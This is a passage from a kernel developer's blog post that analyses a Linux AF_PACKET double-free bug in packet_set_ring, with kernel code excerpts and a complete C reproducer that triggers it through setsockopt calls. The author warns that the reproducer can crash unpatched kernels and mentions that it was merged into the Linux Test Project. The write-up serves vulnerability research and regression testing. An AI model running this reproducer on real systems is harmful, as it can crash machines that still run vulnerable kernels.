</span></span><span class="line"><span class="cl">                        <span class="nf">swap</span><span class="p">(</span><span class="n">rb</span><span class="o">-&gt;</span><span class="n">rx_owner_map</span><span class="p">,</span> <span class="n">rx_owner_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">po</span><span class="o">-&gt;</span><span class="n">pg_vec_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nl">out_free_pg_vec</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="nf">bitmap_free</span><span class="p">(</span><span class="n">rx_owner_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">pg_vec</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nf">free_pg_vec</span><span class="p">(</span><span class="n">pg_vec</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">tp_block_nr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nl">out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><em>Note</em>: The code above doesn&rsquo;t contain the
<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ec6af094ea28f0f2dda1a6a33b14cd57e36a9755">patch</a>
that fixes the bug.</p>
<p>Let&rsquo;s now check the struct where <strong>rx_owner_map</strong> exists:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">packet_ring_buffer</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">pgv</span>              <span class="o">*</span><span class="n">pg_vec</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span>            <span class="n">head</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span>            <span class="n">frames_per_block</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span>            <span class="n">frame_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span>            <span class="n">frame_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span>            <span class="n">pg_vec_order</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span>            <span class="n">pg_vec_pages</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span>            <span class="n">pg_vec_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__percpu</span>   <span class="o">*</span><span class="n">pending_refcnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">unsigned</span> <span class="kt">long</span>                   <span class="o">*</span><span class="n">rx_owner_map</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">struct</span> <span class="n">tpacket_kbdq_core</span>        <span class="n">prb_bdqc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see <strong>rx_owner_map</strong> is part of a union. The patch commit message mentions a stale
pointer, so we can deduct that when the <em>swap(rb-&gt;rx_owner_map, rx_owner_map)</em> is called we
can be dealing with <strong>prb_bdqc</strong>, and not with <strong>rx_owner_map</strong>. At this point, it&rsquo;s useful
to have userspace code to exercise the mentioned functions and start poking around it. The
fastest way to search for userspace code using a Linux kernel feature is by checking the
<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/tools/testing/selftests?id=ec6af094ea28f0f2dda1a6a33b14cd57e36a9755">Linux Kernel selftests</a>
and the <a href="https://github.com/linux-test-project/ltp">Linux Testing Project</a>.</p>
<p>Both projects contain good examples about how to use different kernel features. It was quick
to find an <a href="https://github.com/linux-test-project/ltp/blob/master/testcases/kernel/syscalls/setsockopt/setsockopt02.c">example</a>
of TPACKET usage on LTP.</p>
<p>With a test case in hand and some understanding of what is going wrong, we can check how
<strong>rx_owner_map</strong> ends up containing stale data:</p>
<ul>
<li>When calling <em>setsockopt</em> using TPACKET_V3, RX ring and setting <em>tp_block_nr</em>, pg_vec is
allocated and <strong>init_prb_bdqc</strong> is called setting <strong>prb_bdqc</strong> union member.</li>
<li>If the next call to <em>setsockopt</em>, setting <em>tp_block_nr</em> and <em>tp_frame_nr</em> as 0, <strong>pg_vec</strong> and
<strong>rx_owner_map</strong> are released (or it would be prb_bdqc here, since it&rsquo;s an union?), since
po-&gt;mapped is always 0 here (mmap wasn&rsquo;t called to map the buffer)</li>
<li>Calling <em>setsockopt</em> using TPACKET_V2 passing <em>tp_block_nr</em> and <em>tp_frame_nr</em> as 0, the code goes
directly to release the swapped <strong>rx_owner_map</strong> that was already released in the previous step.</li>
<li><em><strong>Double free</strong></em>.</li>
</ul>
<p>Using the test case as a starting point, I was able to create my own reproducer:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/if_packet.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">ring</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="n">tpacket_req</span>  <span class="n">req</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="n">tpacket_req3</span> <span class="n">req3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">set_ver</span><span class="p">(</span><span class="kt">int</span> <span class="n">ver</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">SOL_PACKET</span><span class="p">,</span> <span class="n">PACKET_VERSION</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ver</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ver</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;setsockopt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Cannot set sock to ver %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ver</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">__v3_fill</span><span class="p">(</span><span class="k">struct</span> <span class="n">ring</span> <span class="o">*</span><span class="n">ring</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">ring</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_retire_blk_tov</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">ring</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_sizeof_priv</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">ring</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_feature_req_word</span> <span class="o">=</span> <span class="n">TP_FT_REQ_FILL_RXHASH</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ring</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_block_size</span> <span class="o">=</span> <span class="nf">getpagesize</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">ring</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_frame_size</span> <span class="o">=</span> <span class="n">TPACKET_ALIGNMENT</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">ring</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_block_nr</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ring</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_frame_nr</span> <span class="o">=</span> <span class="n">ring</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_block_size</span> <span class="o">/</span>
</span></span><span class="line"><span class="cl">				 <span class="n">ring</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_frame_size</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">				 <span class="n">ring</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_block_nr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">setup_ring</span><span class="p">(</span><span class="kt">int</span> <span class="n">mess</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">ring</span> <span class="n">ring</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">__v3_fill</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * First time we call setup_ring, using TPACKET_V3, we send the req3
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * as populated by __v3_fill. In the next calls, we zero two members of
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * the struct, simulating a &#39;close&#39; of the socket. This makes afpacket
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * module to free pg_vec.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 *
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * tpacket_v3 does not allocate rx_owner_map, but instead it sets
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * prb_bdqc, but both are define in a union.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">mess</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">ring</span><span class="p">.</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_block_nr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">ring</span><span class="p">.</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_frame_nr</span><span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">SOL_PACKET</span><span class="p">,</span> <span class="n">PACKET_RX_RING</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ring</span><span class="p">.</span><span class="n">req3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			 <span class="k">sizeof</span><span class="p">(</span><span class="n">ring</span><span class="p">.</span><span class="n">req3</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;setsockopt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">sock</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">PF_PACKET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">sock</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;socket&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">set_ver</span><span class="p">(</span><span class="n">TPACKET_V3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Send complete req3 data */</span>
</span></span><span class="line"><span class="cl">	<span class="nf">setup_ring</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * Pass tp_block_nr and tp_frame_nr, releases pg_vec, and rb-&gt;rw_owner_map
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * is freed
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * */</span>
</span></span><span class="line"><span class="cl">	<span class="nf">setup_ring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* With pg_vec released, we can change the socket version to TPACKET_V2 */</span>
</span></span><span class="line"><span class="cl">	<span class="nf">set_ver</span><span class="p">(</span><span class="n">TPACKET_V2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * With V2, we send again the tp_block_nr/tp_frame_nr zeroed, so
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * afpacket does not try to allocate a pg_vec of rx_owner_map and goes
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * directly to the cleaning part. For V1/V2, it swaps the current
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * allocated rw_owner_map (which wasn&#39;t allocated this time) with the
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * previously stored rw_owner_map (freed in the second setup_ring call
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * above).
</span></span></span><span class="line"><span class="cl"><span class="cm">	 *
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * Now, double free on the way!
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="nf">setup_ring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The comments in the code explains what exactly happens.</p>
<p><em>Be careful:</em> if you are running a kernel without the fix applied (earlier than v5.16-rc6),
running the code above can <strong>crash</strong> your system.</p>
<p>Is a common practice in SUSE to check with QA if a reproducer can be adapted and merged
into LTP. In my case, Martin Doucha was kind enough to adapt the code using the LTP API and
<a href="https://github.com/linux-test-project/ltp/blob/master/testcases/kernel/syscalls/setsockopt/setsockopt09.c">merge it</a>.</p>
<h1 id="considerations">Considerations<a hidden class="anchor" aria-hidden="true" href="#considerations">#</a></h1>
<p>The entire process of checking the bug, understanding the problem, checking for reproducer
and triggering it reliably was gratifying. The kernel samples and the LTP are interesting
resources for research and understanding how kernel interfaces are used, and also to
check if a kernel is vulnerable to a known problem that already contains a reproducer.</p>
<p>Thanks for reading until the end. See you in the next post!</p>
<h1 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h1>
<p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ec6af094ea28f0f2dda1a6a33b14cd57e36a9755">CVE commit fix</a></p>
<p><a href="https://github.com/linux-test-project/ltp/blob/master/testcases/kernel/syscalls/setsockopt/setsockopt09.c">LTP reproducer</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="next" href="https://mpdesouza.com/blog/btrfs-for-mere-mortals-inode-allocation/">
    <span class="title">Next Page »</span>
    <br>
    <span>Btrfs for mere mortals: inode allocation</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://mpdesouza.com">Marcos&#39; Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'copy';

        function copyingDone() {
            copybutton.innerText = 'copied!';
            setTimeout(() => {
                copybutton.innerText = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
